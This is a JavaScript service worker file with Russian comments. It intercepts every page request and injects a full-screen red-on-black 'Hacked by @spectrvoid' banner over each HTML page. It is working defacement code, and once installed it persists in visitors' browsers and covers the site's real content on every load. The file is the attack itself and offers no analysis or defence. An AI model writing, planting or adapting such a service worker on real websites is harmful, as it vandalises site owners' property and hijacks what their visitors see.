// sw.js
self.addEventListener('fetch', function(event) {
  event.respondWith(
    fetch(event.request).then(function(response) {
      // Если это HTML-страница, подменяем содержимое
      if (response.headers.get('content-type')?.includes('text/html')) {
        return response.text().then(function(html) {
          // Внедряем сообщение в начало страницы
          const hackedHTML = `
            <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;display:flex;justify-content:center;align-items:center;background:#000;color:#f00;font-family:monospace;font-size:4rem;font-weight:bold;z-index:999999;text-shadow:0 0 20px#f00;">Hacked by @spectrvoid</div>
            ${html}
          `;
          return new Response(hackedHTML, {
            status: response.status,
            statusText: response.statusText,
            headers: response.headers
          });
        });
      }
      return response;
    })
  );
});
